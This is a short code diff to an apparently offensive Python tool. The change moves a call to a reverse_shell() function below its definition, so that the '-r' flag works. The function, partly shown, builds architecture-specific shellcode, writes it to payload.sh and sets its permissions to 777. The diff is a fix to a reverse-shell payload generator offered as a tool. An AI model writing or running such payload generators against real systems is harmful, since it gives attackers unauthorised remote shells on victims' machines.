@@ -28,9 +28,6 @@ arg_parser.add_argument("--gcc", default="gcc",
 arg_parser.add_argument("sources", nargs=1)
 args = arg_parser.parse_args()
 
-if args.r:
-    reverse_shell()
-
 def reverse_shell():
     shellcode = ''
     if args.a == "x86":
@@ -43,4 +40,9 @@ def reverse_shell():
     f.write(shellcode)
     f.close()
     os.chmod("payload.sh", 777)
+
+if args.r:
+    reverse_shell()
+
+
     
